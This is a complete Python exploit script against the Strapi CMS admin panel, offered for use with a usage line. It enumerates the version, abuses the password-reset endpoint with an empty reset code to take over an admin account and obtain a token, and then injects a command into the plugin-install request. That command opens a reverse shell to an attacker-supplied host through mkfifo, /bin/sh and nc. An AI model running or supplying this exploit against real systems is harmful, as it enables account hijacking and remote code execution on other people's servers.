from requests import get, post
import sys
import json

class strapi_exploit(object):
    def __init__(self, email, url, newpassword):
        self.email = email
        self.url = url
        self.newpassword = newpassword

    def get_version(self):
        res = get(f"{self.url}/admin/strapiVersion")
        return json.loads(res.text)

    def trigger_resetpassword(self):

        data = {
                "email":self.email,
                "url":f"{self.url}/admin/plugins/users-permissions/auth/reset-password"
               }

        post(self.url, json=data)
        return f"password reset attempt has been made to account {self.email}"

    def reset_password(self):
        data = {
                "code":{},
                "password":self.newpassword,
                "passwordConfirmation":self.newpassword
               }

        res = post(f"{self.url}/admin/auth/reset-password", json=data)
        jsondata = json.loads(res.content.decode())
        self.token = jsondata["jwt"]
        return f"Successfull Created session {res.text}"


    def RCE(self,LHOST,LPORT):

        headers = {
            "Authorization":f"Bearer {self.token}",
            "Content-Type":"application/json"
        }

        data = {
            "plugin": f"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f)\",\"port\":\"80\""
        }

        print(data, headers)
        res = post(f"{self.url}/admin/plugins/install", headers=headers, json=data)
        return res.text

if __name__ == "__main__":
    print("Usage: exploit.py email targeturl newpassword LHOST LPORT")
    email = sys.argv[1]
    url = sys.argv[2]
    newpassword = sys.argv[3]
    LHOST = sys.argv[4]
    LPORT = sys.argv[5]
    exp = strapi_exploit(email, url, newpassword)
    print("[+] Enumerating strapi version..")
    print(exp.get_version())
    print("\n[+] Triggering Password reset..")
    print(exp.trigger_resetpassword())
    print(f"\n[+] Resetting Password for account {email}")
    print(exp.reset_password())
    print("\n[+] Exploting StrapCMS")
    exp.RCE(LHOST,LPORT)
